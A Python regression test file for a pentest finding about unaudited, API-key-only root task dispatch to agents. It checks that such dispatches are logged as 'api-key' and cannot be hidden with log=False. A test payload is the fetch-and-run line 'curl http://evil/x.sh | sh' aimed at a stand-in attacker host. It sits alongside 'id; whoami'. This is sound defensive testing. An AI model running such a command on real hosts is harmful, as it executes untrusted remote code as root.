"""Regression guard for the pentest finding 'API-key-only task dispatch runs as
root and is omitted from the activity/audit feed'.

A key-only dispatch (X-API-Key, no admin token) runs on the agent as root. It must
NOT be able to land on a host completely unattributed: queue_agent_task now audits
EVERY dispatched task, attributing a key-only call as 'api-key', and a key-only
caller cannot use log=False to silence that audit.
"""
import backend.db as db
from conftest import key_headers


def _last_activity():
    rows = db.get_activity_log(limit=10)
    return rows[0] if rows else None


def test_key_only_dispatch_is_audited_as_api_key(controller, agent):
    host_id, _ = agent()
    r = controller.post(f"/agents/{host_id}/tasks", headers=key_headers(),
                        json={"command": "curl http://evil/x.sh | sh", "kind": "command"})
    assert r.status_code == 200, r.text
    row = _last_activity()
    assert row is not None, "a key-only root dispatch must appear in the activity feed"
    assert row["username"] == "api-key"
    assert "curl" in (row["command"] or "")


def test_key_only_dispatch_cannot_silence_audit_with_log_false(controller, agent):
    host_id, _ = agent()
    r = controller.post(f"/agents/{host_id}/tasks", headers=key_headers(),
                        json={"command": "id; whoami", "kind": "command", "log": False})
    assert r.status_code == 200, r.text
    row = _last_activity()
    # A key-only caller must NOT be able to skip the audit by setting log=False.
    assert row is not None and row["username"] == "api-key"


def test_internal_read_kind_stays_out_of_feed(controller, agent):
    """Genuine controller-internal reads (sync_users et al.) remain unlogged, so the
    audit change doesn't spam the feed with background probes."""
    host_id, _ = agent()
    r = controller.post(f"/agents/{host_id}/tasks", headers=key_headers(),
                        json={"command": "getent passwd", "kind": "sync_users"})
    assert r.status_code == 200, r.text
    assert _last_activity() is None
